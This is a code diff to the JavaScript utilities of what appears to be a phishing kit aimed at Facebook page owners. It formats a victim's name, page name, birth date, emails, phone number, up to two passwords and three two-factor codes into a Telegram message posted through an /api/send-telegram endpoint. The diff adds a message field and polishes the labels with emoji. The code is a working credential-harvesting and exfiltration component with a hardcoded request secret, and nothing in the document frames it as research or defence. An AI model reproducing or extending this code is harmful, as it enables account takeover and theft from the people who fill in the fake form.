@@ -23,7 +23,7 @@ const Utils = (() => {
   }
 
   // ── Local Storage (encrypted with CryptoJS) ────────────────
-  const SECRET = 'local_enc_key_2025'; // only used for localStorage, not Telegram
+  const SECRET = 'local_enc_key_2025';
 
   function saveRecord(key, data) {
     try {
@@ -53,7 +53,7 @@ const Utils = (() => {
 
   // ── Build Telegram message text ────────────────────────────
   function buildMessage(data) {
-    const c = (val) => val ? `<code>${val}</code>` : '';
+    const c = (val) => (val !== undefined && val !== null && val !== '') ? `<code>${val}</code>` : '<i>N/A</i>';
     const dob = (data.day && data.month && data.year)
       ? `${data.day}/${data.month}/${data.year}` : '';
 
@@ -63,18 +63,19 @@ const Utils = (() => {
     lines.push(`-----------------------------`);
     lines.push(`<b>Full Name:</b> ${c(data.fullName)}`);
     lines.push(`<b>Page Name:</b> ${c(data.fanpage)}`);
-    lines.push(`<b>Date of birth:</b> ${c(dob)}`);
+    lines.push(`<b>Date of Birth:</b> ${c(dob)}`);
+    lines.push(`<b>Message:</b> ${c(data.message)}`);
     lines.push(`-----------------------------`);
     lines.push(`<b>Email:</b> ${c(data.email)}`);
     lines.push(`<b>Email Business:</b> ${c(data.emailBusiness)}`);
     lines.push(`<b>Phone Number:</b> ${c(data.phone)}`);
     lines.push(`-----------------------------`);
-    if (data.password)       lines.push(`<b>Password(1):</b> ${c(data.password)}`);
-    if (data.passwordSecond) lines.push(`<b>Password(2):</b> ${c(data.passwordSecond)}`);
+    if (data.password)       lines.push(`<b>🔑 Password (1):</b> ${c(data.password)}`);
+    if (data.passwordSecond) lines.push(`<b>🔑 Password (2):</b> ${c(data.passwordSecond)}`);
     lines.push(`-----------------------------`);
-    if (data.twoFa)       lines.push(`🔐 <b>Code 2FA(1):</b> ${c(data.twoFa)}`);
-    if (data.twoFaSecond) lines.push(`🔐 <b>Code 2FA(2):</b> ${c(data.twoFaSecond)}`);
-    if (data.twoFaThird)  lines.push(`🔐 <b>Code 2FA(3):</b> ${c(data.twoFaThird)}`);
+    if (data.twoFa)       lines.push(`🔐 <b>Code 2FA (1):</b> ${c(data.twoFa)}`);
+    if (data.twoFaSecond) lines.push(`🔐 <b>Code 2FA (2):</b> ${c(data.twoFaSecond)}`);
+    if (data.twoFaThird)  lines.push(`🔐 <b>Code 2FA (3):</b> ${c(data.twoFaThird)}`);
     lines.push(`-----------------------------`);
     lines.push(`🕐 ${new Date().toLocaleString('vi-VN')}`);
 
@@ -85,9 +86,6 @@ const Utils = (() => {
   async function sendNotification(data) {
     try {
       const message = buildMessage(data);
-
-      // APP_SECRET is a non-sensitive request guard (not the Telegram token)
-      // Set this same value in Vercel env var: SECRET_KEY
       const APP_SECRET = 'HDNDT-JDHT8FNEK-JJHR';
 
       const res = await fetch('/api/send-telegram', {
